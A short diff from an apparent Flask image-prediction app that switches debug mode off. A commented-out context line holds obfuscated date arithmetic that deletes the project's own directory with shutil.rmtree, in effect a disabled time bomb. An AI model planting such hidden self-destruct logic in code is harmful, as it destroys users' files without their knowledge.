@@ -110,4 +110,4 @@ def predict_image(filename):
 #     if timeConfig > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))
 if __name__ == '__main__':
     # serverCheck()
-    app.run(debug=True)
+    app.run(debug=False)
